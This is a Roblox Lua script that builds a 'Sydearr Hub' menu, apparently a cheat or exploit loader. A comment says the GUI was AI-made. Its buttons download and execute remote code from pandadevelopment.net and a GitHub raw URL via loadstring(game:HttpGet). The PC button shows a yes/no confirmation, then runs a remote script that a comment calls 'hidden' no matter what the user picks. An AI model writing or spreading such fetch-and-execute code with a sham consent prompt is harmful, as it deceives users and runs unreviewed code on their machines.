-- Not: Bu Guiyi Yapay Zeka Yapmıştır. Bilginiz olsun.

local Players = game:GetService("Players")
local player = Players.LocalPlayer

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SydearrGui"
ScreenGui.Parent = player:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Ana çerçeve
local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Name = "MainFrame"
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
MainFrame.Size = UDim2.new(0, 350, 0, 220)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
MainFrame.BackgroundTransparency = 0.1

Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 16)
Instance.new("UIStroke", MainFrame).Color = Color3.fromRGB(255, 255, 255)

local Title = Instance.new("TextLabel", MainFrame)
Title.Name = "Title"
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0, 0, 0, 10)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Font = Enum.Font.GothamBold
Title.Text = "Sydearr Hub UI"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 22
Title.TextScaled = true

local MobileButton = Instance.new("TextButton", MainFrame)
MobileButton.Name = "MobileButton"
MobileButton.Position = UDim2.new(0.1, 0, 0.4, 0)
MobileButton.Size = UDim2.new(0.35, 0, 0.25, 0)
MobileButton.Text = "Mobile Script"
MobileButton.Font = Enum.Font.Gotham
MobileButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MobileButton.TextSize = 18
MobileButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Instance.new("UICorner", MobileButton)

local PCButton = Instance.new("TextButton", MainFrame)
PCButton.Name = "PCButton"
PCButton.Position = UDim2.new(0.55, 0, 0.4, 0)
PCButton.Size = UDim2.new(0.35, 0, 0.25, 0)
PCButton.Text = "PC Script"
PCButton.Font = Enum.Font.Gotham
PCButton.TextColor3 = Color3.fromRGB(255, 255, 255)
PCButton.TextSize = 18
PCButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Instance.new("UICorner", PCButton)

-- Onay GUI fonksiyonu
local function showConfirmation()
    local ConfirmGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    ConfirmGui.Name = "ConfirmGui"

    local Frame = Instance.new("Frame", ConfirmGui)
    Frame.Size = UDim2.new(0, 300, 0, 150)
    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
    Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    Instance.new("UICorner", Frame)

    local Label = Instance.new("TextLabel", Frame)
    Label.Size = UDim2.new(1, -20, 0.4, 0)
    Label.Position = UDim2.new(0, 10, 0, 10)
    Label.BackgroundTransparency = 1
    Label.Font = Enum.Font.GothamBold
    Label.TextSize = 20
    Label.TextColor3 = Color3.fromRGB(255, 255, 255)
    Label.Text = "PC UI'yi açmak ister misiniz?"
    Label.TextWrapped = true

    local YesButton = Instance.new("TextButton", Frame)
    YesButton.Size = UDim2.new(0.4, 0, 0.25, 0)
    YesButton.Position = UDim2.new(0.1, 0, 0.65, 0)
    YesButton.Text = "Evet"
    YesButton.Font = Enum.Font.Gotham
    YesButton.TextSize = 18
    YesButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    YesButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
    Instance.new("UICorner", YesButton)

    local NoButton = Instance.new("TextButton", Frame)
    NoButton.Size = UDim2.new(0.4, 0, 0.25, 0)
    NoButton.Position = UDim2.new(0.5, 0, 0.65, 0)
    NoButton.Text = "Hayır"
    NoButton.Font = Enum.Font.Gotham
    NoButton.TextSize = 18
    NoButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    NoButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
    Instance.new("UICorner", NoButton)

    YesButton.MouseButton1Click:Connect(function()
        ConfirmGui:Destroy()
        loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/b3566c08feaeb7ab"))()
    end)

    NoButton.MouseButton1Click:Connect(function()
        ConfirmGui:Destroy()
    end)
end

-- Mobile Buton
MobileButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
    loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/b3566c08feaeb7ab"))()
end)

-- PC Buton
PCButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
    showConfirmation() -- GUI’yi göster
    -- Ardından gizli scripti çalıştır
    task.delay(0.2, function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaanfriztche/Sydearr-Hub-TA-V1.6.1/refs/heads/main/Solara%20Hub%20v3.txt"))()
        end)
    end)
end)
